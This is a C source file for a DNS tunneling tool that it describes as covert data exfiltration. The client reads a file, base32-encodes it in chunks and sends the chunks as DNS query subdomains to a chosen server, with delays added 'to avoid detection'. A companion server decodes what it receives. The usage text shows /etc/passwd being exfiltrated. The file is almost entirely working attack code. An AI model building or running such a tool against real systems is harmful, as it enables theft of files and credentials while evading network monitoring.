/*
 * DNS Tunneling Module
 * Covert data exfiltration via DNS queries
 * Encodes data in subdomains and TXT records
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#define MAX_SUBDOMAIN_LEN 63
#define MAX_LABEL_LEN 63
#define MAX_DNS_LEN 255
#define CHUNK_SIZE 32
#define DNS_PORT 53

// DNS packet structures
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;

typedef struct {
    uint16_t qtype;
    uint16_t qclass;
} dns_question_t;

// Base32 encoding for DNS-safe data
static const char base32_alphabet[] = "abcdefghijklmnopqrstuvwxyz234567";

void base32_encode(const uint8_t* data, size_t len, char* output) {
    size_t i = 0, j = 0;
    uint32_t buffer = 0;
    int bits = 0;
    
    while (i < len) {
        buffer = (buffer << 8) | data[i++];
        bits += 8;
        
        while (bits >= 5) {
            output[j++] = base32_alphabet[(buffer >> (bits - 5)) & 0x1F];
            bits -= 5;
        }
    }
    
    if (bits > 0) {
        output[j++] = base32_alphabet[(buffer << (5 - bits)) & 0x1F];
    }
    
    output[j] = '\0';
}

void base32_decode(const char* input, uint8_t* output, size_t* out_len) {
    size_t i = 0, j = 0;
    uint32_t buffer = 0;
    int bits = 0;
    
    while (input[i]) {
        const char* p = strchr(base32_alphabet, input[i]);
        if (!p) break;
        
        buffer = (buffer << 5) | (p - base32_alphabet);
        bits += 5;
        
        if (bits >= 8) {
            output[j++] = (buffer >> (bits - 8)) & 0xFF;
            bits -= 8;
        }
        i++;
    }
    
    *out_len = j;
}

// Create DNS query packet
int create_dns_query(uint8_t* packet, const char* encoded_data, const char* domain, uint16_t query_id) {
    dns_header_t* header = (dns_header_t*)packet;
    
    // DNS header
    header->id = htons(query_id);
    header->flags = htons(0x0100); // Standard query, recursion desired
    header->qdcount = htons(1);
    header->ancount = 0;
    header->nscount = 0;
    header->arcount = 0;
    
    uint8_t* p = packet + sizeof(dns_header_t);
    
    // Add encoded data as subdomain
    if (encoded_data && strlen(encoded_data) > 0) {
        size_t data_len = strlen(encoded_data);
        
        // Split into labels (max 63 bytes each)
        size_t offset = 0;
        while (offset < data_len) {
            size_t label_len = data_len - offset;
            if (label_len > MAX_LABEL_LEN) {
                label_len = MAX_LABEL_LEN;
            }
            
            *p++ = label_len;
            memcpy(p, encoded_data + offset, label_len);
            p += label_len;
            offset += label_len;
        }
    }
    
    // Add base domain
    const char* dot = domain;
    while (*dot) {
        const char* next_dot = strchr(dot, '.');
        size_t label_len = next_dot ? (next_dot - dot) : strlen(dot);
        
        *p++ = label_len;
        memcpy(p, dot, label_len);
        p += label_len;
        
        if (next_dot) {
            dot = next_dot + 1;
        } else {
            break;
        }
    }
    
    *p++ = 0; // End of domain name
    
    // Question type and class
    dns_question_t* question = (dns_question_t*)p;
    question->qtype = htons(16); // TXT record
    question->qclass = htons(1); // IN class
    p += sizeof(dns_question_t);
    
    return p - packet;
}

// Parse DNS response
int parse_dns_response(uint8_t* packet, size_t packet_len, char* output, size_t max_output) {
    if (packet_len < sizeof(dns_header_t)) {
        return -1;
    }
    
    dns_header_t* header = (dns_header_t*)packet;
    uint16_t answers = ntohs(header->ancount);
    
    if (answers == 0) {
        return 0;
    }
    
    // Skip question section
    uint8_t* p = packet + sizeof(dns_header_t);
    while (*p && p < packet + packet_len) {
        p += *p + 1;
    }
    p++; // Skip null terminator
    p += sizeof(dns_question_t);
    
    // Parse answer section
    for (int i = 0; i < answers && p < packet + packet_len; i++) {
        // Skip name (might be compressed)
        if ((*p & 0xC0) == 0xC0) {
            p += 2; // Compressed name
        } else {
            while (*p && p < packet + packet_len) {
                p += *p + 1;
            }
            p++;
        }
        
        uint16_t type = ntohs(*(uint16_t*)p);
        p += 2;
        
        uint16_t class = ntohs(*(uint16_t*)p);
        p += 2;
        
        p += 4; // TTL
        
        uint16_t data_len = ntohs(*(uint16_t*)p);
        p += 2;
        
        if (type == 16) { // TXT record
            // TXT records have a length byte followed by data
            uint8_t txt_len = *p++;
            if (txt_len > 0 && txt_len < max_output) {
                memcpy(output, p, txt_len);
                output[txt_len] = '\0';
                return txt_len;
            }
        }
        
        p += data_len;
    }
    
    return 0;
}

// DNS tunnel client
typedef struct {
    int sock;
    struct sockaddr_in server;
    char domain[256];
    uint16_t query_id;
} dns_tunnel_t;

dns_tunnel_t* dns_tunnel_init(const char* server_ip, const char* domain) {
    dns_tunnel_t* tunnel = malloc(sizeof(dns_tunnel_t));
    if (!tunnel) return NULL;
    
    // Create UDP socket
    tunnel->sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (tunnel->sock < 0) {
        free(tunnel);
        return NULL;
    }
    
    // Set server address
    tunnel->server.sin_family = AF_INET;
    tunnel->server.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, server_ip, &tunnel->server.sin_addr);
    
    // Set domain
    strncpy(tunnel->domain, domain, sizeof(tunnel->domain) - 1);
    
    // Initialize query ID
    srand(time(NULL) ^ getpid());
    tunnel->query_id = rand() & 0xFFFF;
    
    return tunnel;
}

// Send data via DNS tunnel
int dns_tunnel_send(dns_tunnel_t* tunnel, const uint8_t* data, size_t len) {
    uint8_t packet[512];
    char encoded[256];
    
    // Encode data
    base32_encode(data, len, encoded);
    
    // Create DNS query
    int packet_len = create_dns_query(packet, encoded, tunnel->domain, tunnel->query_id++);
    
    // Send query
    if (sendto(tunnel->sock, packet, packet_len, 0, 
               (struct sockaddr*)&tunnel->server, sizeof(tunnel->server)) < 0) {
        return -1;
    }
    
    return 0;
}

// Receive data via DNS tunnel
int dns_tunnel_recv(dns_tunnel_t* tunnel, uint8_t* data, size_t max_len) {
    uint8_t packet[512];
    char encoded[256];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    
    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(tunnel->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    // Receive response
    int packet_len = recvfrom(tunnel->sock, packet, sizeof(packet), 0,
                             (struct sockaddr*)&from, &fromlen);
    
    if (packet_len <= 0) {
        return -1;
    }
    
    // Parse response
    int encoded_len = parse_dns_response(packet, packet_len, encoded, sizeof(encoded));
    if (encoded_len <= 0) {
        return 0;
    }
    
    // Decode data
    size_t decoded_len;
    base32_decode(encoded, data, &decoded_len);
    
    return decoded_len;
}

// Exfiltrate file via DNS tunnel
int dns_exfiltrate_file(dns_tunnel_t* tunnel, const char* filename) {
    FILE* fp = fopen(filename, "rb");
    if (!fp) {
        printf("[-] Failed to open file: %s\n", filename);
        return -1;
    }
    
    printf("[*] Exfiltrating file: %s\n", filename);
    
    uint8_t buffer[CHUNK_SIZE];
    size_t total_sent = 0;
    size_t bytes_read;
    
    while ((bytes_read = fread(buffer, 1, CHUNK_SIZE, fp)) > 0) {
        if (dns_tunnel_send(tunnel, buffer, bytes_read) < 0) {
            printf("[-] Failed to send chunk\n");
            fclose(fp);
            return -1;
        }
        
        total_sent += bytes_read;
        printf("[*] Sent %zu bytes\n", total_sent);
        
        // Rate limiting to avoid detection
        usleep(100000); // 100ms delay
    }
    
    fclose(fp);
    printf("[+] File exfiltrated: %zu bytes total\n", total_sent);
    
    return 0;
}

// DNS tunnel server (for testing)
void dns_tunnel_server(const char* domain) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return;
    }
    
    printf("[*] DNS tunnel server listening on port %d\n", DNS_PORT);
    printf("[*] Domain: %s\n", domain);
    
    uint8_t packet[512];
    struct sockaddr_in client;
    socklen_t client_len;
    
    while (1) {
        client_len = sizeof(client);
        int packet_len = recvfrom(sock, packet, sizeof(packet), 0,
                                 (struct sockaddr*)&client, &client_len);
        
        if (packet_len > 0) {
            printf("[*] Received DNS query from %s\n", inet_ntoa(client.sin_addr));
            
            // Parse query to extract data
            uint8_t* p = packet + sizeof(dns_header_t);
            char extracted[256] = {0};
            int offset = 0;
            
            while (*p && offset < sizeof(extracted) - 1) {
                int label_len = *p++;
                if (label_len > 0 && label_len < 64) {
                    memcpy(extracted + offset, p, label_len);
                    offset += label_len;
                    p += label_len;
                }
            }
            
            if (offset > 0) {
                // Decode data
                uint8_t decoded[128];
                size_t decoded_len;
                base32_decode(extracted, decoded, &decoded_len);
                
                printf("[+] Extracted data (%zu bytes): ", decoded_len);
                for (size_t i = 0; i < decoded_len; i++) {
                    printf("%02x ", decoded[i]);
                }
                printf("\n");
                
                // Send response (acknowledgment)
                dns_header_t* response_header = (dns_header_t*)packet;
                response_header->flags = htons(0x8180); // Response, no error
                response_header->ancount = htons(0);
                
                sendto(sock, packet, sizeof(dns_header_t), 0,
                      (struct sockaddr*)&client, client_len);
            }
        }
    }
    
    close(sock);
}

// Main function for testing
int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("DNS Tunneling Tool\n");
        printf("Usage:\n");
        printf("  Client: %s client <server_ip> <domain> <file>\n", argv[0]);
        printf("  Server: %s server <domain>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s client 8.8.8.8 tunnel.example.com /etc/passwd\n", argv[0]);
        printf("  %s server tunnel.example.com\n", argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "client") == 0) {
        if (argc < 5) {
            printf("Usage: %s client <server_ip> <domain> <file>\n", argv[0]);
            return 1;
        }
        
        dns_tunnel_t* tunnel = dns_tunnel_init(argv[2], argv[3]);
        if (!tunnel) {
            printf("[-] Failed to initialize DNS tunnel\n");
            return 1;
        }
        
        printf("[+] DNS tunnel initialized\n");
        printf("[*] Server: %s\n", argv[2]);
        printf("[*] Domain: %s\n", argv[3]);
        
        return dns_exfiltrate_file(tunnel, argv[4]);
        
    } else if (strcmp(argv[1], "server") == 0) {
        if (argc < 3) {
            printf("Usage: %s server <domain>\n", argv[0]);
            return 1;
        }
        
        dns_tunnel_server(argv[2]);
        
    } else {
        printf("Unknown mode: %s\n", argv[1]);
        return 1;
    }
    
    return 0;
}